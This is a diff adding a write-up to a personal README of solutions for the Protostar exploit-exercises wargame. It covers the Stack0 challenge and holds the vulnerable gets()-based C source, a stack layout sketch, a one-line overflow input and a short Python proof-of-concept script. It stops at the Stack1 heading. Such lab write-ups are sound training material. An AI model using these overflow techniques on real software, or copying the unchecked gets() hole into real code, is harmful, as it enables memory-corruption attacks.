@@ -2,4 +2,47 @@
 protostar sploits and solutions 
 https://exploit-exercises.com/protostar
 
-NOTE: This is only a collection of my files used in the challenges. Full write up / general organization to come!
+NOTE: write ups in progress. Adding python exploit poc's to each excercise for practice!
+
+Stack0
+============================================
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+
+  modified = 0;
+  gets(buffer);
+
+  if(modified != 0) {
+      printf("you have changed the 'modified' variable\n");
+  } else {
+      printf("Try again?\n");
+  }
+}
+
+Stack looks like:
+ ---------------------------------------
+| eip | ebp | modified(0) |   buffer    |
+ ---------------------------------------
+fill buffer with gets 
+since buffer = 64 bytes, an input of 65 bytes should overflow and overwrite modified
+
+winning command:
+python -c "print 'a'*64+'1'" | ./stack0
+
+Python exploit script for this challenge
+from subprocess import Popen, PIPE
+################
+buffer = 64
+fill = "A"*buffer
+input=fill+"1"
+#################
+cproc = Popen("./stack0", stdin=PIPE, stdout=PIPE)
+print cproc.communicate(input)[0]
+
+
+---------------------------------------------------------------------------------------------------------------------
+Stack1
+
